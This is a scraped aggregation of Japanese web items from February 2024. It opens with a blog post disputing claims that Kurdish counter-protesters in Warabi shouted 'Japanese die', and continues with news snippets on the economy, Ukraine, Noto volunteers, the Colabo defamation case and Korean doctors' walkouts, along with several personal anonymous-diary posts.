33秒ころ女性の声で「あんたたち恥を知りなさい」

36秒ごろ女性の声で「日本の恥」？

39秒ごろ女性の声で「あんたたちね、差別デモや差別で日本は守れない」

以上の様な言葉が聞き取れる。例えば「（精神）病院に行け」などの発言がカウンターとして良いのかという議論はあり、その部分で問題視されるというのはあり得る。しかしながら石井孝明の下記発言が行われた事によって全く別の解釈が行われている。



https://twitter.com/TV65377118/status/1759211027991023672

「病院に行け」を「日本人死ね」と聞き取ったのだ。動画を見ればわかる様に「病院に行け」と発言者は三回言っており、三回目の頭には「精神」が付き、さらにお尻には「レイシスト」が付く。「日本人死ね」と言っている場合、三つめは「精神日本人死ねレイシスト」という意味不明の言葉を羅列している事にもなる。さらにいえばこれはクルドに対するヘイトデモに対するカウンターであり「レイシスト死ね」ならばともかく「日本人死ね」はカウンター側の発言としても意味が不明だ。カウンターデモには日本人も当然いる。「日本人死ね」と言っていると読んだ後にも「病院に行け」と言っている様にしか聞こえない。しかし、石井孝明の投稿はバズり、「日本人死ね」と言っていると解釈した人間が多数現れる。動画を聞いたうえで。



https://twitter.com/bigawamp/status/1759216415343575156



https://twitter.com/TM47383445/status/1759232639880581613



https://twitter.com/TV65377118/status/1759211027991023672



https://twitter.com/ginseiou/status/1759363119053467815

※投稿が長いので割愛

以上の様に動画を聞いたうえでも彼らは「日本人死ね」と聞こえている。サヨクが「病院に行け」と強弁したと言っているアカウント存在しており、ここまでくると彼らは「そう聞こえる」のだろうとしか言えない。最早ここまでくるとこの件で言葉を交わして議論をすること自体不可能だろう。それが少数ならばよかったが、石井やその投稿に付和雷同するアカウント、まとめブログもえるあじあの「【恐怖】埼玉県、駅前でクルド人集団が怒号「ニホンジンシネ！」連呼」などによって、あたかもクルド人が「日本人死ね」と言っている事が半ば既成事実化して語られている*1。石井孝明はSNS上におけるクルド人へのバッシング言説のオピニオンリーダーといえるが、しかし彼自身の発信は以前にも指摘した様にそのソースが胡乱であり、信用に値するとは言えないレベルのものも存在する。今回もそれに値するが、さらに一歩先に進んだ感がある。多くの人がまっさらな状態で聞けば「病院に行け」と聞こえると思える音声だ。それが簡単に覆されている。ものすごい粗悪で悪質な語り手に語り場がジャックされている。





■お布施用ページ

paypay → ID：denmok
Title: ２月18日の蕨で行われた日の丸街宣倶楽部に対するカウンターデモでクルド人は「日本人死ね」と言ってはいないと思う - 電脳塵芥

Link: https://gendai.media/articles/-/124557
Content: 最後のひと押しが足りない岸田首相

内閣府は2月15日、2023年10－12月期のGDP速報（1次速報）を発表した。2四半期連続のマイナス成長となったが、その内容はどうだったのか、1-3月期以降に期待できるのか。

今期実質GDP（年率換算）は▲0.4%。その内訳は民間消費▲0.9%、住宅投資▲4.0%、設備投資▲0.3%、政府消費▲0.5%、公共投資▲2.5%、輸出11.0%、輸入7.0%だった。

あと少しのところでプラス成長を逃したが、公的部門が情けない。昨年11月6日の「現代ビジネス」本コラム「岸田首相の「減税を含む経済政策」はまったく不十分だ…データで検証してみると」において指摘したが、景気対策をしたのにもかかわらず、目玉であったはずの所得税減税を昨年年末にやらずに、今年6月に後回ししたことが痛かった。

photo by gettyimages

岸田政権があまり景気対策に本気でなかったことが少なからず影響しているのではないか。岸田政権はアベノミクスを継承しているので、いいところまでいくが、最後のひと押しが足りない。

今年1月1日の本コラムなどで何度も指摘しているが、GDPギャップも実態とは乖離した数字を出し、景気対策を矮小化しようとした。所得税減税についても、「増税メガネ」と揶揄された岸田首相が反発したのはよかったものの、いいタイミングで実施ができなかった。

財務省の意見を代弁していると思われるIMF対日審査では、「所得税減税を含め11月の財政刺激パッケージは妥当ではなかった」という見解がIMFから出されたが、それは財務省の意見と見てもいいだろう。
Title: GDPがドイツに敗れて「世界4位」に転落したワケ…30年間日本経済が「まともに成長しなかった」理由を教えよう（髙橋 洋一） @gendai_biz

Link: https://mainichi.jp/articles/20240218/k00/00m/030/055000c
Content: 焼け崩れた自宅前で、亡くなった息子夫婦と孫3人について話すタチアナ・プチャーチナさん。ロシア軍の無人航空機攻撃によって起きた火の手が市民の命を奪った＝ウクライナ北東部ハリコフ市で2024年2月13日、鈴木一生撮影

ウクライナ第2の都市、北東部ハリコフ市は2022年2月の侵攻開始以来、継続してロシア軍の標的となってきた。今月9日夜の無人航空機（ドローン）攻撃で少なくとも市民7人が犠牲となった現場を13日に訪れると、自宅だった建物前でタチアナ・プチャーチナさん（61）がむせび泣いていた。

「戦争が息子夫婦と幼い孫3人の命を一瞬にして奪った。ロシアを決して許さない」。プチャーチナさんは変わり果てた自宅を眺めながらそう語った。

「孫たちに本を読むのが喜びだった」

屋根が崩れ落ち、黒く焦げたレンガの枠組みだけが残る住宅が並ぶ。周辺一帯には石油の臭いが漂う。ロシアのドローンが、…
Title: ウクライナ侵攻2年：生まれ育ったロシアを「許さない」　無人機攻撃で家族全滅、怒りの涙 | 毎日新聞

Link: https://www.itmedia.co.jp/news/articles/2402/19/news091.html
Content: さいたま市は2月16日、9日に発送した給付金の通知書で、氏名の一部に誤表記があったと16日に発表し、謝罪した。

発送した12万通のうち4438通で、JIS規格の文字コードに含まれない外字を含む氏名について、正しい漢字が適用されなかったという。

ニュースリリースより

対象の郵送物は「さいたま市物価高騰対応重点支援給付金のお知らせ」。

給付金に関する事務を受託している事業者が、外字を適正に印字する設定を誤ったため文字化けが起きたという。

9日に委託事業者から納品された通知を、郵便局に差し出すために仕分けをしている際、市職員が誤表記を発見した。その時点で発送を終えていた4438通は差し止められなかったという。

市は対象者に対して、事態の経緯をまとめた詫び状を送った。また、問題発覚後に発送した通知は、すべて正しく印字されていることを確認したという。

氏名が誤印字でも通知の内容は有効で、給付金の振込などへの影響はないとしている。
Title: 市民への郵送物、JISコード外の氏名が文字化け　さいたま市が謝罪

Link: https://www.kobe-np.co.jp/news/society/202402/0017343758.shtml
Content: 能登半島地震で、災害ボランティアのあり方が問われている。発災１カ月が過ぎても、災害ボランティアセンター（ボラセン）を通じて活動しているのは延べ２７３９人。阪神・淡路大震災では発生１カ月で延べ６２万人だった。「ボランティア元年」から２９年。自立した市民社会の後退を危惧する声も出る。

■「プロとアマを区別してしまう空気」

１月中旬。「神戸国際支縁機構」（神戸市垂水区）のメンバーは石川県珠洲市に連絡を取り、医師や看護師と一緒に避難所を訪問した。そこに医師はおらず、避難者らの体調も心配されたが、活動を断られたという。市に問い合わせると、「現場に任せているので」と言われた。

国内外の被災地支援に携わってきた同機構。岩村義雄代表（７５）は「能登では、災害派遣医療チーム（ＤＭＡＴ）など公的に認められた団体でなければ活動しにくい。プロとアマを区別してしまう空気がつくられてしまった」と嘆く。

背景の一つに、交通事情などを理由としたボランティアの自粛ムードがある。石川県によると、現地で活動した一般募集のボランティアは２月１６日時点で、延べ２７３９人。公的なボラセンに登録し、活動した人数だ。同県は「個別に被災地に行くことはお控えください」と呼びかけている。

一方、食料や宿泊場所を自ら確保し、得意分野で支援する「専門ボランティア」は１１４団体が現地入り。国などと連携する「全国災害ボランティア支援団体ネットワーク（ＪＶＯＡＤ）」がコーディネート役だが、神戸国際支縁機構など所属していない団体は活動していてもカウントされない。

■東日本大震災でも

ボランティアの自粛ムードは東日本大震災（２０１１年）や熊本地震（１６年）などでもみられた。

議論の源流は阪神・淡路大震災だ。当時全国から駆けつけたボランティアの活動をどう捉えるか。「混乱」と「自由」の両側面が指摘されたが、大阪大大学院教授の渥美公秀さん（６２）＝災害社会学＝は「行政側は『混乱』と捉え、全て管理したいという空気がその後、出てきた」と指摘し、続けた。「市民活動を信じない風潮が根底にある」

渥美さんによると、能登半島での活動を希望する学生もいるが、「ＳＮＳ（交流サイト）でたたかれる」と萎縮し、被災地入りを諦めているという。渥美さんが副理事長のＮＰＯ法人「日本災害救援ボランティアネットワーク」（西宮市）は独自の拠点をつくり、ボランティアを受け入れるつもりだ。

「被災地ＮＧＯ恊働センター」（神戸市兵庫区）顧問の村井雅清さん（７３）も阪神・淡路で殺到したボランティアについて「行政は混乱したが、被災地は助かった」と振り返る。

当時は多くがボランティア初心者。「失敗や間違いもあったが十人十色、みんな自分で考えて動いた」。聴覚障害者に気付いてもらえるよう「肩をたたいて」と書いたプラカードをぶら下げて歩く人もいた。

新たな市民社会の到来を感じさせた２９年前を振り返り、村井さんは言う。

「市民が自主的に動ける文化がなくなっていると感じる。あの時のボランティアたちに申し訳ない」

（高田康夫）

【災害発生後のボランティア】兵庫県の記録によると、阪神・淡路大震災の発生から１カ月間で活動したのは約６２万人。１年では約１３７万人だった。東日本大震災では、災害ボランティアセンターを通して活動した（岩手、宮城、福島県）のは発生５０日で約２３万人。およそ１年で約１０２万人。いずれも延べ数。
Title: 能登半島地震、ボランティアの数少なく　自粛や「SNSでたたかれる」萎縮する人も　1カ月で2739人、阪神・淡路は62万人

Link: https://togetter.com/li/2317225
Content: 感想
Title: 勃起の意味を知らない小4が真っ裸で勃起したちんちん振り回して「ゴーゴー！ブンブーン！」って踊ってて泣きそう→性教育始めよう

Link: https://anond.hatelabo.jp/20240218154547
Content: ■ 明石市長と学校の先生／閃いた！先生に水道工事させたら工事代ただ！

前明石市長の泉房穂氏について。

子育て支援で有名ではてなでも主にリベラル派から評価されることの多い氏だが、単に必要なインフラの維持管理費用をケチっていただけでは？との批判がある。

それに対して泉房穂氏が「明石市のインフラ整備は評価されている」と反論しているので中身を見ていこうと思う。

泉房穂氏の反論

https://twitter.com/izumi_akashi/status/1758651490145632421 泉 房穂（いずみ ふさほ）@izumi_akashi 「明石市が『インフラメンテナンス大賞』の「特別賞」を受賞したって言うのが分かりやすかったですよ😁」とのこと。アドバイス、ありがとうございます。ネット上では明石市がインフラ整備を怠っているかのようなデマが拡散されているが、事実としては、明石市はインフラ整備でも評価をいただいている。

インフラメンテナンス大賞特別賞の受賞内容

https://www.city.akashi.lg.jp/seisaku/kouhou_ka/shise/koho/hodo/documents/20221205infuramentenansu.pdf 施設包括管理担当、学校管理課、学校の先生の３者が連携して、 柔軟な発想で安価に一定の効果が出る手法で問題解消した。 ③学校の先生 透水管への排水誘導のために掘削・埋戻し 12月 0円

まとめ

つまり、「水道工事に学校の先生を動員すればタダやんけ！」ってことだね。

もちろんその時間の学校の先生の給与は払われてて、教員としては働けてないんだからゼロってわけじゃないと思うんだが、アホなのか？

土木に対しても教職に対しても、プロに対する敬意ってものがまったく感じられないね。

そういえば少し昔、エンジニアに焼きそば焼かせて批判浴びた企業もあったよね

というかこれを実績として誇るって相当ヤバい人なのかもしかして。

ツイートシェア
Title: 明石市長と学校の先生／閃いた！先生に水道工事させたら工事代ただ！

Link: https://anond.hatelabo.jp/20240218130536
Content: ■ 不安感に襲われたときに心がけていること

・死にたいと思い始めたら、それは「死にたい」じゃなくて「逃げたい」なんだと頭の中で繰り返す。

・誰かに批判されて苦しくなったら、「私は私のことが好き」と頭の中で繰り返す。

・わけわからないまま不安に襲われたら、全てに「ありがとう」と思って不安感を抑圧する。

・個別的な不安（明日の仕事のこととか）は、その不安な考えを落ち葉にくるんで、川に流すようなイメージを考える。

・近い時期の不安は10年後を考える。おそらく乗り越えられていると安心するようにする。

ツイートシェア
Title: 不安感に襲われたときに心がけていること

Link: https://www3.nhk.or.jp/news/html/20240219/k10014363271000.html
Content: 逮捕されたのは、賭けマージャンのサイト「DORA麻雀」を運営する、千葉県浦安市の会社員で、アメリカ国籍のランダル アーロン アシャー容疑者（36）や、福岡や沖縄に住む25歳から47歳の会社員ら、合わせて7人です。



警察によりますと、7人は、去年3月から12月にかけてネット上で客6人に賭けマージャンをさせ、手数料を得ていたなどとして賭博開帳図利の疑いが持たれています。



客のもうけの10％から15％を手数料として回収し、サイトを開設した2011年から去年12月までにおよそ23億円を不正に得ていたとみられるということです。



オンラインカジノの運営者はギャンブルを合法としている海外に拠点を置くことが多く、国内でカジノの場を提供したとして賭博開帳図利の疑いで逮捕されるのは全国で初めてです。



警察によりますと、調べに対し、グループのリーダー格だったアシャー容疑者など3人は容疑を認めているということです。



ほかの4人は「サイトに関する仕事はしていたが、自分の担当していた部分は違法でないと思っていた」などと一部否認しているということです。



サイトでは、違法性はないとうたっていましたが、国内でオンラインカジノで金を賭ける行為は違法になり、警察は、客についても賭博などの疑いで捜査を進めています。
Title: ネット賭けマージャン 会社員ら逮捕 オンラインカジノ運営で初 | NHK

Link: https://president.jp/articles/-/78562
Content: 男性が男性に｢おまえ大丈夫か｣と呼びかけて加害を防ぐ時代へ

｢痴漢しそうな人に男性が声かけ防ぐ｣｢ホームに発情BOX｣何度も被害に遭った女性が考案した"平和な解決策" 男性が男性に｢おまえ大丈夫か｣と呼びかけて加害を防ぐ時代へ

痴漢はなぜなくならないのか。漫画家の田房永子さんは「現実的ではないと分かってはいるが、以前から私は、痴漢をしそうな男性がいたらほかの男性が『おまえ大丈夫か』と声をかけて落ち着かせ、加害を防げるといいのにと思っていた。今年1月に、テレビ東京の『ゴッドタン』で、ロバートの秋山竜次氏が披露していた歌を見て、『男性が、男性へ“自分の性欲との付き合い方”を訴えかけている』と感激し、新しい時代を感じた」という――。

ロバート秋山氏の「名曲」

今年の1月3日深夜にテレビ東京で放送された「ゴッドタンSP 第21回 芸人マジ歌選手権」。その中で披露されたロバートの秋山竜次氏の歌が「名曲だ」と話題になっていました。

マジ歌選手権は、お笑い芸人の人たちが本格的なメロディと演奏と歌唱に、独自の世界観の歌詞をつけて真剣に歌う、毎年正月の恒例企画です。

Tシャツ姿にニット帽をかぶったロバート秋山氏がPOPなメロディに乗せて歌ったのは「Are you KENZEN？～僕らの魔法～」。

2月16日時点ではTVerで見られるほか、テレビ東京の公式サイトでも3月2日まで配信しているので、ぜひ観てほしいのですが、1番の歌詞だけ書き起こさせていただきます。

Are you KENZEN？～僕らの魔法～ 作 秋山竜次 【セリフ】事前にヌイトケ！ 抜きゃいいじゃん FU！ おイタしたり不倫しちゃったり ハメ外しそうな夜 その前に

自分でタンク空！ にすりゃいい

歓楽街 行く前に マジで1回（簡単な作業さ）

挟むだけで すぅ～っと変な気なくなる（不思議だね）

お遊び 美女の誘惑 ハニートラップ

一瞬で全てを手放すリスク

その前に10分のURAWAZA ハメ外しそうな夜 その前に自分でタンク空！ にすりゃいい歓楽街 行く前に マジで1回（簡単な作業さ）挟むだけで すぅ～っと変な気なくなる（不思議だね）お遊び 美女の誘惑 ハニートラップ一瞬で全てを手放すリスクその前に10分のURAWAZA 【コーラス】タマノナカヲ カラニスル ギシキ カゾクノ タメニヤル ギシキ FU！ カゾクノ タメニヤル ギシキ FU！ 邪念が出る前に抜きゃイイジャン 1度抜いときゃ4～5時間無欲さ

つべこべ言わずに抜くべきじゃん

どいつもこいつも 危機感がない 1度抜いときゃ4～5時間無欲さつべこべ言わずに抜くべきじゃんどいつもこいつも 危機感がない 【明るいサビ】抜きゃいいじゃん！ 抜きゃいいじゃん！（チェックインして） なぜ抜かない？ 抜くべきじゃん（出かける前に）

また邪念が出たら 部屋もどり抜きゃいいじゃん！

抜くって大事だね なぜ抜かない？ 抜くべきじゃん（出かける前に）また邪念が出たら 部屋もどり抜きゃいいじゃん！抜くって大事だね

昔のSMAPのテイストを思わせる親しみやすく元気なサウンドで爽やかに歌われる「Are you KENZEN？～僕らの魔法～」。

ちなみに「抜く」とは射精の意味です。つまりこの歌の場合は自慰を指します。

サビの後も、秋山氏は審査員に向かって叫びます。

「みなさん抜いていきましょう！ 抜かなくて溜まるから 変なこと起こす！ 抜けば絶対にそんなことなくなるから！ みんないなくなるの嫌だよ！」

審査員たちも「名曲だ」と感心しています。

私も電撃が走ったように感激しました。

「男性同士呼びかけ時代の到来」を感じた

男性が、男性へ「自分の性欲との付き合い方」を訴えかける。

男性自身が、自分たちが引き起こす失言／失態／失敗による社会的失墜と、性欲との関係を認めている。

これは新しい時代の到来と言っていいのではないか。

単に不倫とか性的なトラブルが明るみに出るとテレビに出られなくなるから、気を付けようよってだけの歌かもしれない。

おイタすると、世間から猛烈に怒られ、キャリアを全捨てさせられるというシステムへの対策、かもしれない。

それでも、とりあえずはそういった形であっても、いよいよ男性のセルフケア重視の概念、そして男性同士呼びかけ時代の到来を感じ、感動したのです。
Title: ｢痴漢しそうな人に男性が声かけ防ぐ｣｢ホームに発情BOX｣何度も被害に遭った女性が考案した"平和な解決策" 男性が男性に｢おまえ大丈夫か｣と呼びかけて加害を防ぐ時代へ

Link: https://anond.hatelabo.jp/20240219011406
Content: ■ 27歳大学受験合格体験記

10ヶ月間大学受験の勉強をして合格したので、備忘録として残す





27歳、女

最終学歴は高卒（所謂自称進学校）

毒親に進路を強制されて看護学校に入ったが耐えきれなくなり中退し就職、今に至る





大学を目指した理由

①仕事がない

仕事をやり始めた当初は大変なときがあったが、慣れるとルーチンワーク化してしまいつまらなくなった。

転職しようか悩んだが、興味のある仕事は大卒以上の仕事ばかり。

そこで大学に興味を持つ。

②大卒の新人が優秀すぎる

私の仕事は一時期炎上した底辺職ランキングに入っている。

新卒の子たちがうちの現場に来ることがあったんだが、優秀のなんの。

誰でもできる仕事だからたまにかなりヤバい人が入ってくるときがあるんだけど、大卒の方はヤバい人率が格段に下がるのを肌で感じた。

さらに大学に興味を持つ。

③優秀な頭脳に殴られたかったから

昔から「地頭が良い」と言われていたが20代も後半に差し掛かり、地頭だけではどうにもならないと思うようになった。

私は全く優秀ではないのに、今の職場では持ち上げられてやたら優秀な社員という扱いをされるのも嫌だった。

自分が階級が下になれて自分より優秀な人にけちょんけちょんにされたいと思うようになった。

ついに受験勉強をすることにした。





休みの日は一日10時間以上

仕事の日は通勤時間（往復2時間）に英単語or古文単語

週3で予備校にも通った

上司が理解のある方で受験勉強をしていることや予備校に通っていることを伝えてシフトを減らしたり、職位を下げてくれたことには感謝している。





社会人受験の感想

はっきり言ってまったくオススメしない。

現役時代のときに大学に行けるなら絶対に行ったほうがいい。

自分で決めたこととはいえ、周りは結婚したり飲みに行ったり遊んだりしている中勉強をすることはつらかった。

モチベーション維持が本当に大変だった。





社会人受験検討者へ

私のように20代後半を過ぎて大学に行きたいと思っている方がいれば参考にしてほしい。

①予備校選びは吟味しろ

予備校は2,3校選んで吟味したほうがいい。

私は1校で決めてしまったので後悔している（予備校の先生方は本当に良い方ばかりだった）

②英検利用ができるなら英検を取れ

私は働きながら3科目（国数英）勉強したが、10ヶ月間で3科目は本当に大変だった。

もし英検利用ができれば英語の勉強だけでも早めに始めて、英単語と英文法を取得したら早めに英検は取るべき。

受験直前に1科目減らすことができるのはかなり気が楽になるだろう。

③現役時代の得意科目は意外と得意のまま

私の現役時代の得意科目は現代文で、現代文だけ模試の偏差値が60越えることもあった。

（自称）進学校卒であれば、模試を受けることもあったはず。

現役時代に得意な科目があれば、そのまま得意科目として得点源になりうる。

私の場合現代文が得点源で、あわせて英語の長文読解が伸びて得点源になった。

（自称）進学校以外卒の方の場合は分からん。申し訳ない。

ツイートシェア
Title: 27歳大学受験合格体験記

Link: https://nordot.app/1132151600934650385
Content: 警察車両の赤色灯

若年女性を支援する一般社団法人「Colabo（コラボ）」（東京）を中傷する書き込みをインターネット上にしたとして、警視庁新宿署は19日までに名誉毀損の疑いで、「暇空茜」を名乗るユーチューバーの男性（41）＝東京都港区＝を書類送検した。15日付。署によると、男性は「コラボのホームページを見て論評を書いただけ」と話している。

書類送検容疑は2022年9月、自身のブログに「10代の女の子をタコ部屋に住まわせて生活保護を受給させ、毎月一人6万5千円ずつ徴収している」などと書き込んでコラボの名誉を傷つけた疑い。

署は検察に刑事処分の判断を委ねる「相当処分」の意見を付けた。
Title: 「暇空茜」名乗る男性を書類送検　女性支援Colaboを中傷疑い ｜ 共同通信

Link: https://mainichi.jp/articles/20240218/k00/00m/040/190000c
Content: 今年が最後の開催になった岩手県奥州市の伝統行事「蘇民祭（そみんさい）」を巡っては、2008年にJR東日本が「不快感を与えかねない」と祭りのポスターの駅構内での掲示を拒む騒ぎがあった。ポスターのモデルとなった男性にインタビューした同年2月4日岩手面の記事を再掲する。（年齢や経歴は掲載当時のもの）

◇ ◇ ◇

1000年の伝統を誇る奥州市水沢区の黒石寺蘇民祭が、今年も13日夜から14日朝にかけ行われる。ところが今年はJR東日本が「胸毛など不快に感じさせるものを見せるのはセクハラ」と構内でのポスター掲示を拒否した騒動で、逆に全国から注目を集めることになった。蘇民祭ポスターのモデルになり、にわかに時の人となった佐藤真治さんに話を聞いた。【石川宏】

Advertisement

――「おれも傷ついたよ……」。胸毛のある上司から私も責められました。

コントラストの問題でしょう。ほら特別濃くないでしょう（と、胸毛を見せていただく）。

――宙を見上げたような表情ですが、どんな場面だったんですか？

本堂のもみあいの中で蘇民袋がなくなった。ひそかに持って道路まで逃げた者がいるかもしれないなどとごたごたしているうち、東京のなじみの参加者から「真ちゃん、袋拾ったんだけど……」って声をかけられた。それで「袋、ここにあるぞぉー」て、どっち向いて叫んでいいか分かんないから、上を向いて叫んだ。その瞬間です。ほら、左手に持つ蘇民袋も写ってる。

――祭りに出るには苦労があると聞きました。

1週間前から、お精進に入る。肉、魚、卵、乳製品は何も食べられない。一番ダメなのが鶏と卵。黒石寺は本堂を一昼夜で再建しようとしたが、一部が未完成のうちに鶏が鳴き夜明けを告げたという伝承があるから。それで鶏を嫌う。ニラやネギ、ニンニクもいけないんだが、実は最近になって知って、それからやめた。中学生の時はお精進せずに出てしまったが、高校に入ってからは時々失敗しながらも続けている。

――苦労してまで参加する蘇民祭の魅力は？

実は、逆に最近、自分はなんのために行ってるんだろうって考えちゃう。特別な願い事があるわけでも、男と男の肉弾戦に燃えるわけでもない。当たり前の年中行事の一つ、というところなんです。

――ポスター騒動に巻き込まれました。

1月8日の朝8時半に「お前の記事が載ってるぞ」ってメールが来て……。JRの掲示拒否の話はカメラマンさんから12月16日に聞いてました。でも、ポスターに載ったこと自体はうれしくてしょうがない。こういう形になって、まあJRさんには感謝してますよ、皮肉でなくて。……いや皮肉もあるのかなあ……。

――全国に知られ、観光客も増えるかもしれません。

イベントやフェスティバルとは違います。儀式です。騒ぎたくて来る者は覚悟して来い、と言いたい。

何かを願う気持ちがあって、お薬師さんのご加護をと、ここに来て、その結果「激しくも厳しいすてきな祭りがあるんだ」って帰ってもらえるならうれしい。でも人が来ようと来まいと、私には関係ないんです。原点に返って今まで通りやるだけです。

さとう・しんじ

花巻市在住。中学時代に高校合格を願い参加したのが蘇民祭との縁。黒石寺蘇民祭では04年に優勝者である取主、05年から祭りを仕切る世話人（親方）の見習い。昨年は▽胡四王神社蘇民祭▽光勝寺五大尊蘇民祭▽早池峰神社蘇民祭の花巻市内3蘇民祭を制覇した。父佐藤寛治さん（59）も70年に同じ3蘇民祭を制覇しており、75年には黒石寺蘇民祭で取主になっている。本職は製造業の会社員。

黒石寺蘇民祭

裸の男が厄よけの護符である蘇民袋と袋の中の小間木（こまぎ）を奪い合う祭り。護符は薬師如来から厄よけを授かった蘇民将来（そみんしょうらい）の子孫であると証明するものとされる。県南各地にあるが、黒石寺は最も古く1000年続くとされる。黒石寺での開催は旧暦正月7日（今年は2月13日）夜から翌日朝にかけて。
Title: 蘇民祭ポスター、過去にJRが掲示拒否　モデル男性はどう語っていたか | 毎日新聞

Link: https://www.jiji.com/jc/article?k=2024021800247&g=pol
Content: 自民党は、派閥の政治資金パーティー収入裏金事件で、キックバック（還流）を政治資金収支報告書に記載しなかった議員に野党が「納税」を求めていることについて神経をとがらせている。折しも２０２３年分所得税などの確定申告が１６日から始まり、対応を誤れば国民から一層の不信感を招きかねないためだ。

「不公平感ない徴税重要」 確定申告開始で林官房長官

「こういったお金は所得になるし、脱税にもなる」。立憲民主党の泉健太代表は１６日の記者会見で、確定申告が始まったことに触れつつ、こう強調した。衆院予算委員会の質疑では立民議員が「国民は増税、自民は脱税」と攻め立てる場面もあった。

政治団体への寄付は政治活動に使われる場合、原則として課税されない。しかし、野党は、領収書などで政治活動に使ったと証明できない分については、所得税の納付が必要な「雑所得」に当たると主張する。

泉氏が問題視したのは１５日公表の自民党調査の中身だ。聞き取りを行った安倍、二階両派の国会議員ら８５人のうち３１人が、収支報告書に不記載だった還流資金について「使用していなかった」と答えた。国税庁は国会で「政治家個人に帰属する政治資金を使用せず、長年保存していた場合、課税関係が生じる」と指摘している。

還流資金を受け取った議員に対し自民が納税させる案を検討していると一部で報じられた１５日、岸田文雄首相（党総裁）は「承知していない。議員個人が受領した例は把握していない」と火消しに追われた。

自民党関係者は「確定申告の時期だから文句も出てきて、国税庁も困っている」と明かす。納税すべきだとの声は党内にもくすぶるが、納税すれば議員個人として受け取ったことを認めることになり、「これまでの前提が崩れる」（党幹部）との慎重論が強い。
Title: 自民、「納税」要求の高まり警戒　確定申告捉え野党攻勢―派閥裏金事件：時事ドットコム

Link: https://www3.nhk.or.jp/news/html/20240219/k10014363821000.html
Content: 矢野氏は1972年に大創産業の前身となる日用品や雑貨をトラックに積んで移動販売する会社を創業し、すべての商品を100円均一で売る方法で、業績を伸ばしました。



その後、1987年から100円ショップ「ダイソー」を展開し、2001年には台湾に海外1号店をオープンして国内と海外でチェーン展開を進め、店舗数はおよそ5000店舗と業界最大手に成長させました。



2018年には、経営の若返りを図るため、代表権のない会長に退きました。



翌年には会長も退任し、その後は広島大学や母校の中央大学で特別招へい教授として教育に力を注いできたほか、経営者を対象にしたセミナーで講演を行うなどしていました。



会社によりますと、矢野氏は2月12日、心不全のため東広島市で亡くなったということです。80歳でした。
Title: 矢野博丈氏死去 80歳「ダイソー」展開する大創産業の創業者 | NHK

Link: https://mainichi.jp/articles/20240217/k00/00m/040/141000c
Content: アスベストの一種、クリソタイル（白石綿）＝国土交通省の資料から

理科の実験の準備が原因でアスベスト（石綿）関連がんの中皮腫を発症したとみられるとして、69歳で死亡した元小学校教諭の男性が、公務員の労災にあたる公務災害と認定された。遺族への取材で判明した。かつては実験器具に石綿が使われており、飛散した粉じんを吸ったとみられる。石綿による教員の労災認定は事例が少なく、専門家は「氷山の一角だ」と指摘している。

「アルコールランプの芯をさばいた」

和歌山市立小学校の教諭だった山東日出男さんは1977年から2013年にかけて、主に高学年の授業を担当した。21年に中皮腫を発症し、手術担当医からは「石綿が原因」と告げられた。公務災害認定を求めて地方公務員災害補償基金に請求していたが、22年4月に死亡。24年1月、妻が認定通知書を受け取った。

Advertisement

山東さんは基金への申立書で、「理科の授業の準備で、アルコールランプの石綿製の芯の上部をさばいて燃えやすいようにした。飛散して落ちた粉じんの掃除もした。当時は石綿の発がん性を知らず全く無防備だった」と説明していた。ランプで熱するビーカーなどを置く金網も、石綿で耐火被覆されたものを使っていた。

石綿は古代よりランプの芯に使われていたが、石綿製のひもを切断すると、粉じんになりやすいとされる。厚生労働省は04年に石綿の製造、使用を原則禁止にしており、現在、日本製の実験器具に石綿は使われていない。

妻は「病気をしたことがない人だったので診断を聞き、まさかと思った。主人は戻ってこず無念だが、認定に喜んでいると思う」と話している。

「氷山の一角」と専門家

教員の石綿による労災が表面化したのは今回で10人目。実験器具に含まれる石綿が飛散していたなどとして、大学教員らの労災が認められている。しかし、環境再生保全機構の調査では、労災の対象にならない人にも医療費などを支給する「石綿健康被害救済法」に基づき認定された中皮腫患者のうち、242人が教員経験者だった。

中皮腫・じん肺・アスベストセンター（東京都）所長の名取雄司医師は「教員の労災認定が10人程度とは極めて少ない。石綿が吹き付けられた建物内にいて労災認定されるケースは多いが、同じ状況でも教員では特別なことがない限り公務災害として認められないなど、審査が厳し過ぎ、改善を要する。教員もあきらめずに災害認定を求めてほしい」と話している。【大島秀利】
Title: 理科実験の準備でアスベスト労災認定　元小学校教諭の男性 | 毎日新聞

Link: https://news.yahoo.co.jp/articles/13c7c04ff58758c5644b4a306df4a2954ea87d11
Content: 【ソウル聯合ニュース】韓国政府が発表した大学医学部の入学定員増に反発し、ソウルにある五つの大型病院に勤務する専攻医（研修医）全員が19日中に退職届を提出し、20日午前6時以降は勤務しない。それ以外の病院でも多数の専攻医がすでに退職届を提出するなど、退職届の一斉提出の動きは全国に広がっているもようだ。政府と各病院は対策を急いでいるが、救急診療の当直などの中軸である専攻医が一斉に持ち場を離れれば、患者への被害は避けられない。 専攻医らでつくる大韓専攻医協議会は16日、ソウルの「ビッグ5」と呼ばれるソウル大病院、セブランス病院、サムスンソウル病院、ソウル峨山病院、ソウル聖母病院の専攻医代表と議論した結果、これら病院の専攻医全員の退職届提出と勤務中断を決定した。このうちセブランス病院では、小児青少年科など一部の診療科目の専攻医が「19日に退職届を出し（同日）午前7時からストライキに入る」と表明した。同病院では専攻医のストに備え、手術スケジュールの調整などを進めている。 専攻医の指導病院として指定されている全国の病院には約1万3000人の専攻医が勤務している。保健福祉部によると16日午後6時までの集計で、規模が大きい指導病院100か所のうち23か所で計715人が退職届を提出した。 医大生も医学部入学定員増に反発している。全国40の医大のうち35大学の代表が緊急会議を開き、20日に一斉に休学届を出すことを決めた。全国で約2万人に上ると推計される。 こうした動きに曺圭鴻（チョ・ギュホン）保健福祉部長官は18日、同部と各自治体で非常診療対策状況室を運営し、対策をまとめていると説明した。上級総合病院は入院・重症診療を中心に診療機能を維持し、全国約400か所の救急医療機関は24時間の非常診療体制を徹底する計画だ。全国の地方医療院35か所、赤十字社病院6か所、保健所といった公共病院では診療時間を延長し、非対面診療も大幅に拡大する。 退職届を提出して現場を離れた専攻医に対し、保健福祉部は「業務開始（復帰）命令」を出す。これに従い復帰した場合も、実際に勤務しているかチェックを続ける考えだ。業務開始命令に従わない専攻医には「機械的」に法を適用し、厳正に処罰する方針を示している。
Title: ソウル主要5病院の全研修医がきょう退職届　20日から勤務せず（聯合ニュース） - Yahoo!ニュース

Link: https://anond.hatelabo.jp/20240218224637
Content: ■ 夫が腫瘍マーカーで陽性だった

辛い。

木曜日に夫から言われた。

結果待ちだけど本当に辛い。

マーカーの診断名もやばい。

夫の持病に関係している箇所だし本当にやばい。

